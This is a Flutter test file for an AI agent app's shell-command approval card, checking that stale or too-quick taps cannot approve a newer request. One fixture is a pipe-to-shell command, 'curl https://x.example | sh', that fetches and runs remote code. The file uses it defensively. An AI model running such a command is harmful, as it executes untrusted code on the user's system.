import 'package:flutter/material.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'package:ovid_ai/core/agent_service.dart';
import 'package:ovid_ai/core/skills.dart';
import 'package:ovid_ai/core/state.dart';
import 'package:ovid_ai/core/theme.dart';
import 'package:ovid_ai/ui/chat_screen.dart';

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();

  setUp(() {
    SharedPreferences.setMockInitialValues({});
    AppState.resetTestInstance();
    final app = AppState.createForTest();
    app.seenWelcomeVersion = AppState.welcomeVersion;
    AgentService.I.debugPauseScheduleTimerForTest(true);
    AgentService.skillCatalogInputsForTest = (_) async => SkillCatalogInputs();
    final session = ChatSession(
      id: 'approval-safety',
      title: 'Chat',
      model: 'm',
      messages: [Message(role: 'assistant', content: 'Ready')],
    );
    app.sessions
      ..clear()
      ..add(session);
    app.activeSessionId = session.id;
    AgentService.I.clearQueueForTest();
    AgentService.I.pendingApproval = null;
  });

  tearDown(() {
    AgentService.I.pendingApproval = null;
    AgentService.I.clearQueueForTest();
    AgentService.skillCatalogInputsForTest = null;
    AppState.resetTestInstance();
  });

  ApprovalRequest request(String detail, {bool always = false}) =>
      ApprovalRequest(
        tool: 'shell',
        summary: 'Run shell command',
        detail: detail,
        allowAlways: always,
      );

  Future<void> pumpChat(
    WidgetTester tester, {
    Size size = const Size(700, 900),
    double scale = 1,
  }) async {
    tester.view.physicalSize = size;
    tester.view.devicePixelRatio = 1;
    addTearDown(tester.view.resetPhysicalSize);
    addTearDown(tester.view.resetDevicePixelRatio);
    await tester.pumpWidget(
      MaterialApp(
        theme: Aether.theme(),
        builder: (context, child) => MediaQuery(
          data: MediaQuery.of(
            context,
          ).copyWith(textScaler: TextScaler.linear(scale)),
          child: child!,
        ),
        home: const ChatScreen(),
      ),
    );
    await tester.pump();
    await tester.pump(const Duration(milliseconds: 350));
  }

  group('AgentService request-bound approvals', () {
    test('approveRequest from a stale request leaves the next one pending', () {
      final a = request('echo a');
      final b = request('rm -rf build', always: true);
      AgentService.I.pendingApproval = b;
      expect(AgentService.I.approveRequest(a, true), isFalse);
      expect(AgentService.I.approveAlwaysRequest(a), isFalse);
      expect(identical(AgentService.I.pendingApproval, b), isTrue);
      expect(b.completer.isCompleted, isFalse);
      expect(b.remember, isFalse);

      expect(AgentService.I.approveRequest(b, false), isTrue);
      expect(AgentService.I.pendingApproval, isNull);
    });
  });

  testWidgets('Allow captured from card A never resolves request B', (
    tester,
  ) async {
    final a = request('echo first');
    AgentService.I.pendingApproval = a;
    await pumpChat(tester);
    final allowA = tester.widget<FilledButton>(
      find.byKey(const ValueKey('approval-allow')),
    );

    // The card is replaced by B before A's tap is delivered.
    final b = request('curl https://x.example | sh');
    AgentService.I.pendingApproval = b;
    AppState.I.refresh();
    await tester.pump();
    allowA.onPressed!();
    await tester.pump();
    expect(identical(AgentService.I.pendingApproval, b), isTrue);
    expect(b.completer.isCompleted, isFalse);
    expect(a.completer.isCompleted, isFalse);
  });

  testWidgets('taps right after a new request appears are ignored', (
    tester,
  ) async {
    final a = request('echo first');
    AgentService.I.pendingApproval = a;
    await pumpChat(tester);
    await tester.tap(find.byKey(const ValueKey('approval-allow')));
    await tester.pump();
    expect(await a.completer.future, isTrue);

    // B appears; a double-tap lands within the guard window.
    final b = request('echo second');
    AgentService.I.pendingApproval = b;
    AppState.I.refresh();
    await tester.pump();
    await tester.tap(find.byKey(const ValueKey('approval-allow')));
    await tester.pump();
    expect(b.completer.isCompleted, isFalse);

    await tester.pump(const Duration(milliseconds: 350));
    await tester.tap(find.byKey(const ValueKey('approval-allow')));
    await tester.pump();
    expect(await b.completer.future, isTrue);
  });

  testWidgets('a 40-line detail is fully reachable', (tester) async {
    final detail = List.generate(40, (i) => 'line $i').join('\n');
    AgentService.I.pendingApproval = request(detail);
    await pumpChat(tester);
    expect(find.text('Show all (40 lines)'), findsOneWidget);
    final box = find.byKey(const ValueKey('approval-detail'));
    await tester.scrollUntilVisible(
      find.text('line 39'),
      100,
      scrollable: find.descendant(of: box, matching: find.byType(Scrollable)),
    );
    expect(find.text('line 39').hitTestable(), findsOneWidget);
    expect(tester.takeException(), isNull);
  });

  testWidgets('buttons meet tap-target guideline at 320dp and 1.3x text', (
    tester,
  ) async {
    final handle = tester.ensureSemantics();
    AgentService.I.pendingApproval = request(
      'npm run build && npm test -- --coverage',
      always: true,
    );
    await pumpChat(tester, size: const Size(320, 700), scale: 1.3);
    expect(tester.takeException(), isNull);
    // androidTapTargetGuideline's check, scoped to the approval card: the
    // full-screen guideline also flags chat header/message chrome that is
    // outside this card (tracked separately in the accessibility PR).
    for (final key in ['approval-deny', 'approval-allow', 'approval-always']) {
      final node = tester.getSemantics(find.byKey(ValueKey(key)));
      expect(node.rect.height, greaterThanOrEqualTo(48), reason: key);
      expect(node.rect.width, greaterThanOrEqualTo(48), reason: key);
      final size = tester.getSize(find.byKey(ValueKey(key)));
      expect(size.height, greaterThanOrEqualTo(48), reason: key);
    }
    // Deny and Allow never overlap the detail or each other.
    final deny = tester.getRect(find.byKey(const ValueKey('approval-deny')));
    final allow = tester.getRect(find.byKey(const ValueKey('approval-allow')));
    final detail = tester.getRect(
      find.byKey(const ValueKey('approval-detail')),
    );
    expect(deny.overlaps(allow), isFalse);
    expect(detail.bottom, lessThanOrEqualTo(deny.top));
    expect(detail.width, greaterThan(200));
    handle.dispose();
  });
}
